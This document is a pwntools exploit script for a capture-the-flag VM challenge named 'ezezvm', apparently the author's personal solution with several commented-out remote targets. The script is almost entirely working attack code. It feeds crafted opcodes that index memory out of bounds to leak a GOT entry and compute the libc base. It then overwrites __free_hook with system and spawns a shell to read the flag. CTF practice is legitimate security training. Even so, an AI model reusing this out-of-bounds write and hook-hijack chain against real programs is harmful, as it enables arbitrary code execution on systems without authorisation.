from pwn import *
from pwncli import *
from struct import pack
from ctypes import *

# io = remote("127.0.0.1", 55299)
# io = remote("192.168.170.128", 1234)
# io = remote("competition.blue-whale.me", 20631)
# io = remote("182.92.237.102", 10015)
elf_name = "ezezvm"
io = process(elf_name)
# io = remote("3.1.2.3", 8888)
# context(os="linux", arch="amd64")
context(os="linux", arch="amd64", log_level="debug")
elf = ELF(elf_name)
libc = ELF('/home/yukon/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
# libc = ELF('./libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('/home/yukon/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6')  # ctfshow用的ubuntu18.04
lg_infos = []
lga = lambda data: lg_infos.append(data)
s = lambda data: io.send(data)
sl = lambda data: io.sendline(data)
sa = lambda text, data: io.sendafter(text, data)
sla = lambda text, data: io.sendlineafter(text, data)
r = lambda n: io.recv(n)
ru = lambda text: io.recvuntil(text, timeout=0.1)
rl = lambda: io.recvline()
int16 = lambda a: int(a, 16)
strencode = lambda a: str(a).encode()
uu32 = lambda: u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b'\x00'))
uu64 = lambda: u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
iuu32 = lambda: int(io.recv(10), 16)
iuu64 = lambda: int(io.recv(6), 16)
uheap = lambda: u64(io.recv(6).ljust(8, b'\x00'))
# lg = lambda addr: log.success(addr)
# lg = lambda addr: log.info(addr)
lg = lambda data : io.success('%s -> 0x%x' % (data, eval(str(data))))
ia = lambda: io.interactive()

def log_all():
    for lg_info in lg_infos:
        lg(lg_info)

def attach(io, gdbscript=""):
    log_all()
    gdb.attach(io, gdbscript)


def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))


def get_IO_str_jumps():
   IO_file_jumps_offset = libc.sym['_IO_file_jumps']
   IO_str_underflow_offset = libc.sym['_IO_str_underflow']
   for ref_offset in libc.search(p64(IO_str_underflow_offset)):
       possible_IO_str_jumps_offset = ref_offset - 0x20
       if possible_IO_str_jumps_offset > IO_file_jumps_offset:
          print(possible_IO_str_jumps_offset)
          return possible_IO_str_jumps_offset

menu = b"Enter your choice: \n"

def g():
    gdb_sript = '''
    set debug-file-directory /home/yukon/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/.debug\n
    file %s\n
    sharedlibrary\n
    file\n
    sharedlibrary\n
    ''' % elf_name
    # b *$rebase(0xAA4)\n
    # b *$rebase(0xDA1)\n
    # b *$rebase(0xEC9)\n
    # b *$rebase(0xCF9)\n
    # gdb.attach(io)
    # gdb.attach(io, 'b printf')
    gdb.attach(io, gdb_sript)
    log_all()

# gdb.attach(io)
# gdb.attach(io, 'b printf')
# gdb.attach(io, 'b *0x4011B4')

def code(op, dest, sr1, sr2):
    code = (op << 24) + (dest << 16) + (sr1 << 8) + sr2
    sl(str(code))

'''
0x10 reg[dest] = sr2;
0x20 reg[dest] = 0;
0x30 reg[dest] = memory[reg[sr2]];
0x40 memory[reg[sr2]] = reg[dest];
0x50 push reg[dest];
0x60 pop reg[dest];
0x70 reg[dest] = reg[sr2] + reg[sr1];
0x80 reg[dest] = reg[sr1] - reg[sr2];
0x90 reg[dest] = reg[sr2] & reg[sr1];
0xa0 reg[dest] = reg[sr2] | reg[sr1];
0xB0 reg[dest] = reg[sr2] ^ reg[sr1];
0xC0 reg[dest] = reg[sr1] << reg[sr2];
0xD0 reg[dest] = reg[sr1] >> reg[sr2];
0xE0 :
    sp == 0 -> exit
    sp != 0 -> running = 0
'''

sla(b"PC: ", b'10')
sla(b"SP: ", b'1')
sla(b"CODE SIZE: ", b'28')
ru(b'CODE')
# pause()
code(0x10, 0, 0, 8)     # reg[0] = 8
code(0x10, 1, 0, 0xff)  # reg[1] = 0xff
code(0x10, 2, 0, 0xff)  # reg[2] = 0xff
code(0xc0, 1, 1, 0)     # reg[1] = reg[1] << reg[0] = 0xff00
code(0x70, 1, 1, 2)     # reg[1] = reg[1] + reg[2] = 0xffff
code(0xc0, 1, 1, 0)     # reg[1] = reg[1] << reg[0] = 0xffff00
code(0x70, 1, 1, 2)     # reg[1] = reg[1] + reg[2] = 0xffffff
code(0xc0, 1, 1, 0)     # reg[1] = reg[1] << reg[0] = 0xffffff00
code(0x10, 2, 0, 0xD0)  # reg[2] = 0xc8
code(0x70, 1, 1, 2)     # reg[1] = reg[1] + reg[2] = 0xffffffd0 <= -0x30

# mem -> 0x202060
# got -> 0x201FA0
# distance = (0x202060 - 0x201FA0) / 4 = 0x30
code(0x30, 3, 0, 1)  # reg[3] = memory[reg[1]] = mem[-0x30] <= got
code(0x10, 2, 0, 1)  # reg[2] = 1
code(0x70, 2, 1, 2)  # reg[2] = reg[1] + reg[2] = 0xffffffd0 + 1
code(0x30, 4, 0, 2)  # reg[4] = memory[reg[1]] = mem[0x2f] <= got + 2

# free_hook = reg[3] + 0x2cf458
code(0x10, 5, 0, 0x2c)  # reg[5] = 0x2c
code(0xc0, 5, 5, 0)     # reg[5] = reg[5] << reg[0] = reg[5] << 8 = 0x2c00
code(0x10, 6, 0, 0xf4)  # reg[6] = 0xf4
code(0x70, 5, 5, 6)     # reg[5] = reg[5] + reg[6] = 0x2cf4
code(0x10, 6, 0, 0x50)  # reg[6] = 0x50
code(0xc0, 5, 5, 0)     # reg[5] = reg[5] << reg[0] = reg[5] << 8 = 0x2cf400
code(0x70, 5, 5, 6)     # reg[5] = reg[5] + reg[6] = 0x2cf450
code(0x70, 3, 3, 5)     # reg[3] = reg[3] + reg[5] = __free_hook - 8

#
code(0x10, 2, 0, 0x28)  # reg[2] = 0x28
code(0x70, 1, 1, 2)     # reg[1] = reg[1] + reg[2] = 0xfffffff8 = -8
code(0x40, 3, 0, 1)     # memory[reg[sr2]] = reg[dest]; mem[-8] = reg[3]
code(0x10, 2, 0, 1)     # reg[2] = 1
code(0x70, 1, 1, 2)     # reg[1] = reg[1] + reg[2] = 0xfffffff9 = -7
code(0x40, 4, 0, 1)     # memory[reg[sr2]] = reg[dest]; mem[-7] = reg[4]
# code(0xE0, 3, 3, 5)

ru(b'R3: ')
low_got = r(8)
print(low_got)
ru(b'R4: ')
high_got = r(4)
print(high_got)

got = int16(b'0x' + high_got + low_got)
libc_base = got - 0x3c67a0
lga("got")
lga("libc_base")

sla(b"HOW DO YOU FEEL AT OVM?\n", b'/bin/sh\x00' + p64(libc.sym['system'] + libc_base))
# g()
sleep(1)
sl(b'cat /flag')

ia()
# io\.recvuntil\("(.*?)"\)
# io\.recvuntil\(b"$1"\)
# io\.sendline\(str\((.*?)\)\)
# io\.sendline\(str\($1\)\.encode\(\)\)